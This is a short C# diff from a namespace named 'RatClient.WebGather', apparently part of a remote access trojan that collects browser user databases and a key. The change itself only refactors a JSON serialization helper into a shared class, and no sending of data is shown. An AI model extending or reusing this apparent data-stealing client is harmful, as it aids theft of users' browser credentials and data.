@@ -114,18 +114,7 @@ namespace RatClient.WebGather
                 }
                 result.Add(new UserDataBase(Path.GetFileNameWithoutExtension(i), db));
             }
-            return SerializeToJson(new FullResult(GcKey, result.ToArray()));
-        }
-
-
-        private static byte[] SerializeToJson<T>(T obj)
-        {
-            using (MemoryStream ms = new MemoryStream())
-            {
-                DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(T));
-                serializer.WriteObject(ms, obj);
-                return ms.ToArray();
-            }
+            return Tools.SerializeToJson(new FullResult(GcKey, result.ToArray()));
         }
     }
 }
